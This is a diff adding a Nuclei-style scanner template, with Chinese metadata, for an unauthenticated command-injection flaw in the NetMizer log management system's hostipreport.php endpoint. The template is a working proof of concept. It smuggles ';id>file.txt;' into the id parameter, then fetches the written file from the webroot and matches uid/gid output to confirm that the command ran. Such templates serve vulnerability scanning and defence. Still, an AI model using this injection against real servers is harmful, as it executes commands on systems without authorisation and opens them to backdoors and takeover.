@@ -1,0 +1,52 @@
+id: netmizer-hostipreport-rce
+info:
+  name: NetMizer日志管理系统hostipreport接口存在RCE漏洞
+  author: leadlife
+  severity: critical
+  description: NetMizer 日志管理系统hostipreport接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/bef1259d4babbff23c207ae283004ec96ddb1fdb/wpoc/NetMizer/NetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fhostipreport%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: netmizer,rce
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        GET /data/yxproject/hostipreport.php?action=showtask&id=;id>{{filename}}.txt; HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+
+      - |+
+        GET /data/yxproject/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Connection: close
+        Cache-Control: no-cache
+        Pragma: no-cache
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+        
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_2
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
